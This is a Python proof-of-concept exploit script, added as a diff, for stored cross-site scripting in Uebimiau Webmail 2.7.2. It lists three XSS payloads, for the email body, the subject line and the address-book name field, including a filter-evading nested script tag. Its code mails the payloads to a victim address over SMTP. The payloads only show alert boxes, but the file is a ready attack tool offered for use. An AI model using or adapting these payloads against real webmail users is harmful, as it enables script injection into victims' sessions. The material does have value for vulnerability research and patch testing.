@@ -1,0 +1,103 @@
+#!/usr/bin/python
+
+'''
+# Exploit Title: Uebimiau Webmail Stored XSS
+# Date: 17/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://www.uebimiau.org/
+# Software Link: http://www.uebimiau.org/downloads/uebimiau-2.7.2-any.zip
+# Version: 2.7.2
+ 
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+
+About the Application:
+======================
+
+Uebimiau is an universal webmail developed in PHP by Aldoir Ventura.
+It is free and can be installed in any email server.
+
+-It runs under any System;
+-It doesn't require any extra PHP modules;
+-Doesn't need a database (as MySQL, PostreSQL,etc)
+-Doesn't need IMAP, but compatible with POP3 and IMAP
+-Compatible with the MIME Standard (send/receive text/html emails);
+-Doesn't need cookies;
+-Easy installation. You only modify one file;
+-Compatible with Apache, PHP, Sendmail or QMAIL;
+-Can be easily translated into any language (already translated in 17 languages);
+-Can use a variety of skins
+
+
+
+
+Vulnerability Description
+=========================
+
+
+1. Stored XSS in e-mail body.
+
+XSS Payload: <scr<script>ipt></scr</script>ipt>'//\';alert(String.fromCharCode(88,83,83))//\";</script>
+
+Send an email to the victim with the payload in the email body, once the user opens the message the XSS should be triggered.
+
+
+2. Stored XSS in "Title" field ( works when victim opens message in full view).
+
+XSS Payload: SubjectGoesHere"><img src='1.jpg'onerror=javascript:alert("XSS")>
+
+This one requires you to send at least 2 messages to the victim with the payload in the email subject.
+
+Location of injection in page source:
+
+<a class="menu" href="readmsg.php?folder=inbox&pag=1&ix=1&sid={4F0FCD8FECD59-4F0FCD8FECD6C-1326435727}&tid=0&lid=5" 
+title="Uebimiau Webmail Stored XSS POC "><img src='1.jpg'onerror=javascript:alert("XSS")>">Next</a> :: 
+<a class="menu" href="javascript:goback()">Back</a> ::
+
+3. Stored XSS in Address Book
+
+XSS Payload: <script>alert("XSS")</script>
+
+Create a new contact with the XSS Payload in the "Name" field, Save contact, XSS Should be triggered when viewing contacts.
+
+'''
+
+import smtplib
+
+print "###############################################"
+print "#      Uebimiau Webmail Stored XSS POC        #"
+print "#            Coded by: Shai rod               #"
+print "#               @NightRang3r                  #"
+print "#           http://exploit.co.il              #"
+print "#       For Educational Purposes Only!        #"
+print "###############################################\r\n"
+
+# SETTINGS
+
+sender = "attacker@localhost"
+smtp_login = sender
+smtp_password = "qwe123"
+recipient = "victim@localhost"
+smtp_server  = "10.0.0.5"
+smtp_port = 25
+subject = "Uebimiau Webmail Stored XSS POC"
+xss_payload_1 = """ "><img src='1.jpg'onerror=javascript:alert("XSS")>"""
+xss_payload_2 =  """<scr<script>ipt></scr</script>ipt>'//\';alert(String.fromCharCode(88,83,83))//\";</script>"""
+# SEND E-MAIL
+
+print "[*] Sending E-mail to " + recipient + "..."
+msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
+       % (sender, ", ".join(recipient), subject + xss_payload_1) )
+msg += "Content-type: text/html\n\n"
+msg += """Nothing to see here...\r\n"""
+msg += xss_payload_2
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.ehlo()
+server.starttls()
+server.login(smtp_login, smtp_password)
+print "[*] Sending Message 1\r"
+server.sendmail(sender, recipient, msg)
+print "[*] Sending Message 2\r"
+server.sendmail(sender, recipient, msg)
+server.quit()
+print "[+] E-mail sent!"
